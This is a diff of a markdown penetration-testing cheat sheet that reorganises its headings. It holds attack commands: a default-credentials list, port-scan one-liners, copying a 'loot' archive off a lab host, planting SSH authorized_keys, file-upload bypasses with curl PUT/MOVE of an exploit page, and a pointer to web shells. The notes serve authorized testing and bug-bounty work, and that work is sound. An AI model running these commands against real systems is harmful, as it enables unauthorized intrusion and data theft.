@@ -1,21 +1,21 @@
 ## Useful tips
 
-- For RCE 
-  - Never upload a shell at first, you can be banned from a program. Just execute a `whoami` as a PoC, proceed with a shell if required/allowed.
-- For stored XSS
-  - `console.log()` is better than `alert()`, it makes less noise especially for stored XSS.
-- For SQLi
-  - Don't dump the entire db, you can be banned from a program. Just retrieve the db's name, version and/or other minor infos. Proceed with db dump only if required/allowed;
-  - Don't use tautologies like `OR 1=1`, it can end up in a delete query or something dangerous. It's better to use `AND SLEEP(5)` or `te'+'st`.
-- For subdomain takeovers
-  - use as a PoC an html page like:<br/>
-    9a69e2677c39cdae365b49beeac8e059.html
-    ```HTML
-    <!-- PoC by seeu -->
-    ```
-- For Metasploit: the port `4444` is very common with Metasploit, so this can trigger some warnings. Consider using another port if the exploit doesn't work.
+## Index
 
-### <ins>Glossary</ins>
+- [Glossary](#glossary)
+- [Client-specific key areas of concern](#client-specific-key-areas-of-concern)
+- [General notes](#general-notes)
+- [PT initial foothold](#pt-initial-foothold)
+- [SSH notes](#ssh-notes)
+- [FTP notes](#ftp-notes)
+- [Git commands / shell](#git-commands-shell)
+- [Remote Desktop](#remote-desktop)
+- [SQL connections](#sql-connections)
+- [Reverse engineering](#reverse-engineering)
+- [File upload](#file-upload)
+- [Shells](#shells)
+
+## Glossary
 
 - [Session hijacking](https://owasp.org/www-community/attacks/Session_hijacking_attack)
 - [Session fixation](https://owasp.org/www-community/attacks/Session_fixation)
@@ -52,7 +52,7 @@ Trust:
 
 SYSVOL is a folder that exists on all domain controllers. It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. It is an essential component for Active Directory since it delivers these GPOs to all computers on the domain. Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.
 
-### <ins>Client-specific key areas of concern</ins>
+## Client-specific key areas of concern
 - [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/laws-regulations/index.html), a framework that governs medical data in the US
 - [PCI](https://www.pcisecuritystandards.org/), a framework that governs credit card and payment processing
 - [GDPR](https://gdpr-info.eu/), a Regulation in EU law on data protection and privacy in the EU and the European Economic Area
@@ -60,9 +60,24 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
     - ["Twitter fined ~$550K over a data breach in Ireland’s first major GDPR decision"](https://techcrunch.com/2020/12/15/twitter-fined-550k-over-a-data-breach-in-irelands-first-major-gdpr-decision/), [Tweet from Whitney Merrill](https://twitter.com/wbm312/status/1645497243708067841)
     - See also: [Increasing your bugs with the impact of the GDPR](https://www.youtube.com/watch?v=7JiOqXIZHy0)
 
-### <ins>General notes</ins>
+## General notes
 
-#### <ins>Default Credentials</ins>
+- For RCE 
+  - Never upload a shell at first, you can be banned from a program. Just execute a `whoami` as a PoC, proceed with a shell if required/allowed.
+- For stored XSS
+  - `console.log()` is better than `alert()`, it makes less noise especially for stored XSS.
+- For SQLi
+  - Don't dump the entire db, you can be banned from a program. Just retrieve the db's name, version and/or other minor infos. Proceed with db dump only if required/allowed;
+  - Don't use tautologies like `OR 1=1`, it can end up in a delete query or something dangerous. It's better to use `AND SLEEP(5)` or `te'+'st`.
+- For subdomain takeovers
+  - use as a PoC an html page like:<br/>
+    9a69e2677c39cdae365b49beeac8e059.html
+    ```HTML
+    <!-- PoC by seeu -->
+    ```
+- For Metasploit: the port `4444` is very common with Metasploit, so this can trigger some warnings. Consider using another port if the exploit doesn't work.
+
+Default Credentials
 - admin:admin
 - administrator:administrator
 - admin:password
@@ -79,7 +94,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - firstname:surname
 
 
-#### <ins>PT initial foothold</ins>
+## PT initial foothold
 
 **Light way scan**
 1. `ports=$(nmap -p- --min-rate=1000 -T4 192.168.134.126 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`
@@ -114,7 +129,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`
 - `for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`
 
-#### <ins>SSH notes</ins>
+## SSH notes
 
 - `scp username@remoteHost:/remote/dir/file.txt /local/dir/`
   - `scp Administrator@10.10.210.84:"/C:/Users/Administrator/Downloads/20230824142942_loot.zip" "/home/kali/Documents/engagements/TryHackMe/Post-Exploitation Basics/loot.zip"`
@@ -132,7 +147,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - `put authorized_keys`
 - `sudo ssh benoit@192.168.218.233 -i /root/.ssh/id_rsa`
 
-#### <ins>FTP notes</ins>
+## FTP notes
 
 - `ftp -p IP 1221`
   - `force passive mode`
@@ -143,7 +158,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - Try `binary` for binary mode if the ftp is not working well
 
 
-#### <ins>Git commands / shell</ins>
+## Git commands / shell
 
 - Basic git process
   - `git clone <source>`
@@ -158,7 +173,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
   2. `git checkout -- .`
 
 
-#### <ins>Remote Desktop</ins>
+## Remote Desktop
 
 - `xfreerdp /u:username /p:password /cert:ignore /v:IP`
 - `xfreerdp /u:username /p:password /d:domain.com /v:IP`
@@ -177,7 +192,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
   net localgroup "remote desktop users" <USER. NAME> / add
   ```
 
-#### <ins>SQL connections</ins>
+## SQL connections
 
 - `mysql --host=localhost --user=proftpd --password=protfpd_with_MYSQL_password`
 - `psql -h IP -p 5432 -U root -W`
@@ -200,7 +215,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
 
 
-#### <ins>Reverse engineering</ins>
+## Reverse engineering
 
 - [DNSpy](https://github.com/dnSpy/dnSpy), .NET debugger
 - [Rider](https://www.jetbrains.com/rider/download/#section=windows)
@@ -217,7 +232,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - Deobfuscator: https://www.splitbrain.org/_static/ook/
 
 
-#### <ins>File upload</ins>
+## File upload
 
 - for gifs: `GIF87a;` or `GIF89a;`
 - remember that if you can do an arbitrary upload, then try to view the files with an LFI with `zip://`, `php://` or other wrappers
@@ -227,7 +242,7 @@ SYSVOL is a folder that exists on all domain controllers. It is a shared folder 
 - `curl -X PUT --upload-file exploit.html http://example.com/exploit.html`
 - `curl -X MOVE --header 'Destination:http://example.com/exploit.asp' 'http://exploit.com/exploit.html`
 
-#### <ins>Shells</ins>
+## Shells
 
 **Web shells**
 - In kali, `cd /usr/share/webshells/`
